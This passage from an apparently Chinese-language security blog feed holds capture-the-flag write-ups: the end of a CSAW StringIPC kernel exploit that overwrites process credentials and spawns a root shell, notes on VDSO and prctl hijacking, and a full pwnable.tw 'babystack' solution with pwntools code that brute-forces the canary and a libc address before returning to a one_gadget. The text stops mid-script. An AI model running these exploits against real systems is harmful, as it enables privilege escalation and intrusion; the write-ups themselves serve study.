<span class="built_in">printf</span>(<span class="string">&quot;[+] switch to search @ %llx\n&quot;</span>,cred<span class="number">-0x10</span> +<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i&lt;<span class="number">44</span>;i++)&#123;</span><br><span class="line">        seek_args.id =  alloc_args.id;</span><br><span class="line">        seek_args.index = cred<span class="number">-0x10</span> +<span class="number">4</span> + i ;</span><br><span class="line">        seek_args.whence= SEEK_SET;</span><br><span class="line">        ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args);</span><br><span class="line">        root_cred[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        write_args.id = alloc_args.id;</span><br><span class="line">        write_args.buf = (<span class="type">char</span> *)root_cred;</span><br><span class="line">        write_args.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args);   </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ROOTED!\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Something wrong...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="方法二：劫持VDSO"><a href="#方法二：劫持VDSO" class="headerlink" title="方法二：劫持VDSO"></a>方法二：劫持VDSO</h2><p>VDSO在pwn中有所耳闻。VDSO是一种ELF文件，当进程被加载时，主要是将一些安全上不太重要，但是时间要求很高的内核函数提出来放在VDSO，并一并映射到用户地址空间中。这样用户线程可以直接调用此类函数而不必有陷入内核的开销。以下内容为<a href="https://man7.org/linux/man-pages/man7/vdso.7.html">man vsdo</a>包含了x86_64下的vdso函数。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x86-64 functions</span><br><span class="line">       The table below lists the symbols exported by the vDSO.  All of</span><br><span class="line">       these symbols are also available without the &quot;__vdso_&quot; prefix,</span><br><span class="line">       but you should ignore those and stick to the names below.</span><br><span class="line"></span><br><span class="line">       symbol                 version</span><br><span class="line">       ─────────────────────────────────</span><br><span class="line">       __vdso_clock_gettime   LINUX_2.6</span><br><span class="line">       __vdso_getcpu          LINUX_2.6</span><br><span class="line">       __vdso_gettimeofday    LINUX_2.6</span><br><span class="line">       __vdso_time            LINUX_2.6</span><br></pre></td></tr></table></figure><p>基本想法是：由于VDSO时可执行的段，思考能否利用全局写来给VDSO某个函数写上shellcode(例如gettimeofday)然后想办法触发此函数。但是要注意我们只能等待内核态进程触发此函数。个人觉得这种方法比较牵强，等待root进程调用不太现实(虽然也不失为一种攻击可能性)。</p><p>exp主要参考<a href="http://p4nda.top/2018/11/07/stringipc/#%E5%85%B3%E4%BA%8EVDSO">p4nda师傅</a>，写的很好了。我没有什么创新点就不复制了。思路和之前的差不多，全局搜索找到gettimeofday的地址，覆写指令部分为一段shellcode。由于是驱动级别写，不会触发用户的不可写错误。</p><h2 id="方法三：劫持prctl"><a href="#方法三：劫持prctl" class="headerlink" title="方法三：劫持prctl"></a>方法三：劫持prctl</h2><p>这其实是想通过本题学到的方法。</p><p>prctl全名应该是process control(我猜的)<a href="https://man7.org/linux/man-pages/man2/prctl.2.html">官方文档在这里</a>，主要定义了一些对于线程和进程的操作。但是看解法也太复杂了。。后面再次复现的时候补上，原理过于复杂了</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://ypl.coffee/csaw-2015-stringipc/">https://ypl.coffee/csaw-2015-stringipc/</a></p><p><a href="http://p4nda.top/WooyunDrops/#!/drops/1059.%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E6%9C%89%E6%95%88%E7%9A%84mmap%E4%B8%8Eremap_pfn_range">http://p4nda.top/WooyunDrops/#!/drops/1059.%E7%AE%80%E5%8D%95%E7%B2%97%E6%9A%B4%E6%9C%89%E6%95%88%E7%9A%84mmap%E4%B8%8Eremap_pfn_range</a></p><p><a href="http://p4nda.top/2018/11/07/stringipc/#%E5%85%B3%E4%BA%8EVDSO">http://p4nda.top/2018/11/07/stringipc/#%E5%85%B3%E4%BA%8EVDSO</a></p>]]></content>
      
      
      <categories>
          
          <category> basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable-babystack</title>
      <link href="/2022/02/14/pwnable-babystack/"/>
      <url>/2022/02/14/pwnable-babystack/</url>
      
        <content type="html"><![CDATA[<p>pwnable上300分的babystack。第二次见到利用栈残余数据完成的攻击。利用测信道（不过是程序内的）完成爆破，一开始也没有想到。只能说这题非常巧妙了。做了整整两个晚上才做完。</p><span id="more"></span><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p><img src="/2022/02/14/pwnable-babystack/image-20220214190509919.png" alt="image-20220214190509919"></p><p>可以看到保护全开。由于看名字是栈，这里有canary可能是需要爆破之类的。PIE开启，说明也不能用ROP，考虑用one_gadget解决。那么需要泄露libc，但是也不是堆…(<strong>开始胡言乱语</strong>)</p><p>言归正传，不如看一下IDA。<strong>小然会欺骗你，但IDA不会(doge</strong>)。</p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序主要实现三个功能：登录，copy数据和退出程序。</p><p>copy数据时需要登陆。登录的规则是将输入和一串random输入的数据比较。这里很容易看出strncmp有\x00字符绕过。因此绕过登录十分简单。</p><p>copy时会将用户输入copy到调用者栈上的一个局部变量中。使用的是危险函数strcpy，但是输入大小小于缓冲区大小。似乎我们可以利用strcmp输入到0才结束的条件多复制一些数据。但似乎也无法溢出到返回地址。</p><p><img src="/2022/02/14/pwnable-babystack/image-20220214191516473.png" alt="image-20220214191516473"></p><p>退出程序的时候会调用<code>return</code>而不是<code>exit</code>，说明可以利用return的返回地址。</p><p>乍一看似乎没有明显的漏洞。</p><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>这里是上网查找资料发现。和pwnable.tw上面另一道题see-the-file一样，这里也存在着栈未初始化漏洞(但是很奇怪，现在的ctf比赛中似乎很少涉及这样的漏洞)。注意到以下内容</p><p><img src="/2022/02/14/pwnable-babystack/image-20220214191745504.png" alt="image-20220214191745504"></p><p>我们在比较real_passwd(随机值)和用户输入时，读取了128个字节。这将最多向上覆盖掉栈的128字节内容。</p><p>而我们的copy函数中，所需栈空间正好也是128byte。这说明我们通过cmp_passwd能够完全控制copy函数的栈空间！因此也就能完成消除堆地址或者libc地址附近的\x00字节，完成堆溢出。</p><p><img src="/2022/02/14/pwnable-babystack/image-20220214192035964.png" alt="image-20220214192035964"></p><p>想到这里似乎开心了一下，起码溢出点找到了。但是问题随之而来：怎样泄露libc？怎样泄露canary? 程序中似乎没有直接的泄露函数，好像又没了思路。</p><p>这里其实是另一种侧信道的思想。也就是pwn中”or”(原先是”orw”，缺少了write即输出函数)题目的思想：根据函数返回值判断一个byte输入正确与否，经过很多次的比较完成确定byte。本题中有一个天然的比较函数，也就是登陆时判断输入和main的栈空间中特定位置是否相同的比较函数。比较容易想到：只需要通过00截断，就可以比较任意位置的byte。通过这种机制泄露libc信息和canary数值即可。</p><p>这道题另一个有趣的地方是，本题的canary验证是自己写的，并不依赖编译器。如下图</p><p><img src="/2022/02/14/pwnable-babystack/image-20220214192747990.png" alt="image-20220214192747990"></p><p>通过动态调试发现，所比较的内容正是我们读入的password和原先的random数值。因此我们还不能简单\x00绕过登陆检验就结束，还需要真正的爆破出随机数。</p><p>这就牵涉到另一个问题：如果随机数中或者我们要爆破的libc信息中包含了\x00，怎么办？因为我们input不能包含\x00，否则就会被截断，但是比较又要涉及这个byte。</p><p>一个解决办法是出现\x00就保存上次的信息，重新填充栈为已知数值之后再次爆破。经过实际测算，发生这样事件的概率很小。如果碰到只需要重来就行。因此我们的步骤如下。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>爆破随机数</li><li>利用get_password+copy覆盖原先栈中buf中的\x00byte直到一个libc地址，再次逐字节爆破。</li><li>写回canary，写回程序返回位置(使用one_gadget)</li></ol><h1 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h1><h2 id="get-random"><a href="#get-random" class="headerlink" title="get_random"></a>get_random</h2><p>首先是爆破random的函数。这里就是幼儿园都会的逐字节比较，如果比较到0xff还没有结果，说明今天适合买彩票。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_random</span>():</span><br><span class="line">    random_pre = <span class="string">b&quot;&quot;</span></span><br><span class="line">    result_case = []</span><br><span class="line">    break_flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0x100</span>):</span><br><span class="line">            <span class="comment"># if there exist one zero,not right,bad luck</span></span><br><span class="line">            random_test = random_pre + p8(j) + p8(<span class="number">0x0</span>) <span class="comment"># from the test case</span></span><br><span class="line">            result = get_passwd(random_test)</span><br><span class="line">            <span class="keyword">if</span>(result ==<span class="literal">True</span>):</span><br><span class="line">                success(<span class="string">&#x27;result for byte &#x27;</span> + <span class="built_in">repr</span>(i) + <span class="string">&#x27; is &#x27;</span> + <span class="built_in">repr</span>(<span class="built_in">hex</span>(j)))</span><br><span class="line">                random_pre+=p8(j)</span><br><span class="line">                result_case.append(j)</span><br><span class="line">                io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">                io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># log out</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">0xff</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;bad luck&quot;</span>) <span class="comment"># contains \x00 byte, must overlap and exploit the rest bytes</span></span><br><span class="line">    <span class="keyword">return</span> result_case   </span><br></pre></td></tr></table></figure><h2 id="get-libc"><a href="#get-libc" class="headerlink" title="get_libc"></a>get_libc</h2><p>get_libc本来不用这么复杂，我只是把循环写开了（因为一开始没有注意到还要爆破一个canary…）原理和上面一模一样的。一开始的password_pre只是在栈上找到了一个libc信息的偏移位置。这个要经过调试才能发现为什么要这么写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">    result = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># password_pre = b&quot;a&quot;*0x10+p8(0x31)+p8(0xa)+p8(0x61)*6+b&quot;a&quot;*0x10+p8(0x30)</span></span><br><span class="line">    password_pre = <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>+p8(<span class="number">0x31</span>)+p8(<span class="number">0xa</span>)+p8(<span class="number">0x61</span>)*(<span class="number">6</span>)+p8(<span class="number">0xb4</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">        <span class="comment"># print(&quot;test bit1: &quot; + hex(i))</span></span><br><span class="line">        password_test = password_pre + p8(i) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="comment"># gdb.attach(io,&quot;brva 0xE43&quot;)</span></span><br><span class="line">        result = get_passwd(password_test)</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="literal">True</span>):</span><br><span class="line">            success(<span class="string">&quot;libc byte one: &quot;</span> + <span class="built_in">hex</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     get_passwd(&#x27;\x00&#x27;) # get pass for the nect chance</span></span><br><span class="line">    password_pre+=p8(i)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># reset</span></span><br><span class="line">    <span class="comment"># gdb.attach(io,&quot;brva 0xE43&quot;) # break at strncmp</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">        <span class="comment"># print(&quot;test bit2: &quot; + hex(j))</span></span><br><span class="line">        password_test = password_pre + p8(j) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        result = get_passwd(password_test)</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="literal">True</span>):</span><br><span class="line">            success(<span class="string">&quot;libc byte two: &quot;</span> + <span class="built_in">hex</span>(j))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    password_pre+=p8(j)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># reset</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">        <span class="comment"># print(&quot;test bit3: &quot; + hex(k))</span></span><br><span class="line">        password_test = password_pre + p8(k) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        result = get_passwd(password_test)</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="literal">True</span>):</span><br><span class="line">            success(<span class="string">&quot;libc byte thee: &quot;</span> + <span class="built_in">hex</span>(k))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    password_pre+=p8(k)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># reset</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">        <span class="comment"># print(&quot;test bit4: &quot; + hex(l))</span></span><br><span class="line">        password_test = password_pre + p8(l) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        result = get_passwd(password_test)</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="literal">True</span>):</span><br><span class="line">            success(<span class="string">&quot;libc byte 4: &quot;</span> + <span class="built_in">hex</span>(l))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    libc_info = (<span class="number">0x7f</span> &lt;&lt; <span class="number">0x28</span>) + (l &lt;&lt; <span class="number">0x20</span>) + (k &lt;&lt; <span class="number">0x18</span>) + (j &lt;&lt; <span class="number">0x10</span>) + (i &lt;&lt; <span class="number">0x8</span>) + <span class="number">0xb4</span> </span><br><span class="line">    success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">    <span class="keyword">return</span> libc_info</span><br></pre></td></tr></table></figure><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>最后一个getshell就是利用登陆函数布置好栈，借用copy一次性复制过去导致栈溢出。放好random1和random2绕过canary。最终触发one_gadget结束。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># final OG to ret to hijack, since we don&#x27;t leak pie base</span></span><br><span class="line">og = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xef6c4</span>,<span class="number">0xf0567</span>]</span><br><span class="line"></span><br><span class="line">password3 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">63</span> + p64(random1) + p64(random2) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(libc_base + og[<span class="number">0</span>])*<span class="number">2</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># log out</span></span><br><span class="line">get_passwd(password3) <span class="comment"># pass</span></span><br><span class="line">payload2 = <span class="string">b&#x27;aaaaaaaa&#x27;</span></span><br><span class="line">copy(payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0xFF1&quot;) # break at memcmp</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x1051&quot;) # break at leave return</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>) <span class="comment"># exit</span></span><br></pre></td></tr></table></figure><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keyring <span class="keyword">import</span> get_password</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> true</span><br><span class="line">filename=<span class="string">&quot;./babystack&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;libc_64.so.6&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">password1 = <span class="string">b&#x27;\x00ab&#x27;</span></span><br><span class="line">password2 = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">63</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">16</span>+p8(<span class="number">0xff</span>)+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">password_getrandom = <span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_passwd</span>(<span class="params">passwd</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your passowrd :&#x27;</span>)</span><br><span class="line">    io.send(passwd)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">b&#x27;Success&#x27;</span> <span class="keyword">in</span> io.recvline()):</span><br><span class="line">        <span class="comment"># success(&quot;right&quot;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">copy</span>(<span class="params">payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Copy :&#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;brva 0xEA5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">    result = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># password_pre = b&quot;a&quot;*0x10+p8(0x31)+p8(0xa)+p8(0x61)*6+b&quot;a&quot;*0x10+p8(0x30)</span></span><br><span class="line">    password_pre = <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>+p8(<span class="number">0x31</span>)+p8(<span class="number">0xa</span>)+p8(<span class="number">0x61</span>)*(<span class="number">6</span>)+p8(<span class="number">0xb4</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">        <span class="comment"># print(&quot;test bit1: &quot; + hex(i))</span></span><br><span class="line">        password_test = password_pre + p8(i) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        <span class="comment"># gdb.attach(io,&quot;brva 0xE43&quot;)</span></span><br><span class="line">        result = get_passwd(password_test)</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="literal">True</span>):</span><br><span class="line">            success(<span class="string">&quot;libc byte one: &quot;</span> + <span class="built_in">hex</span>(i))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     get_passwd(&#x27;\x00&#x27;) # get pass for the nect chance</span></span><br><span class="line">    password_pre+=p8(i)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># reset</span></span><br><span class="line">    <span class="comment"># gdb.attach(io,&quot;brva 0xE43&quot;) # break at strncmp</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">        <span class="comment"># print(&quot;test bit2: &quot; + hex(j))</span></span><br><span class="line">        password_test = password_pre + p8(j) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        result = get_passwd(password_test)</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="literal">True</span>):</span><br><span class="line">            success(<span class="string">&quot;libc byte two: &quot;</span> + <span class="built_in">hex</span>(j))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    password_pre+=p8(j)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># reset</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">        <span class="comment"># print(&quot;test bit3: &quot; + hex(k))</span></span><br><span class="line">        password_test = password_pre + p8(k) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        result = get_passwd(password_test)</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="literal">True</span>):</span><br><span class="line">            success(<span class="string">&quot;libc byte thee: &quot;</span> + <span class="built_in">hex</span>(k))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    password_pre+=p8(k)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>) <span class="comment"># reset</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">0xff</span>):</span><br><span class="line">        <span class="comment"># print(&quot;test bit4: &quot; + hex(l))</span></span><br><span class="line">        password_test = password_pre + p8(l) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">        result = get_passwd(password_test)</span><br><span class="line">        <span class="keyword">if</span>(result == <span class="literal">True</span>):</span><br><span class="line">            success(<span class="string">&quot;libc byte 4: &quot;</span> + <span class="built_in">hex</span>(l))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    libc_info = (<span class="number">0x7f</span> &lt;&lt; <span class="number">0x28</span>) + (l &lt;&lt; <span class="number">0x20</span>) + (k &lt;&lt; <span 